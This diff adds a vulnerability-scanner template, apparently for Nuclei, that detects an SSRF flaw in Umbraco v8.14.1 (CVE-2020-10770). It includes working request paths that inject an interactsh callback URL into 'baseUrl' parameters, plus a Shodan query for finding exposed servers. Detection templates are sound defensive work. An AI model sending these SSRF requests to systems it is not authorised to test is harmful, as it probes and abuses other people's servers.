@@ -1,0 +1,35 @@
+id: umbraco-base-ssrf
+info:
+  author: dhiyaneshDk
+  classification:
+    cve-id: CVE-2020-10770
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
+    cvss-score: 5.3
+    cwe-id: CWE-601
+  metadata:
+    shodan-query: http.html:"Umbraco"
+    verified: true
+  name: Umbraco v8.14.1 - 'baseUrl' SSRF
+  reference:
+  - https://www.exploit-db.com/exploits/50462
+  severity: medium
+  tags: ssrf,umbraco,oast
+requests:
+- matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
+  - dsl:
+    - len(body_1)==0
+    - len(body_2)==0
+    - len(body_3)==0
+    type: dsl
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/umbraco/BackOffice/Api/Help/GetContextHelpForPage?section=content&tree=undefined&baseUrl=http://{{interactsh-url}}'
+  - '{{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardContent?section=TryToAvoidGetCacheItem111&baseUrl=http://{{interactsh-url}}/'
+  - '{{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardCss?section=AvoidGetCacheItem&baseUrl=http://{{interactsh-url}}/'
+  req-condition: true
+  stop-at-first-match: true
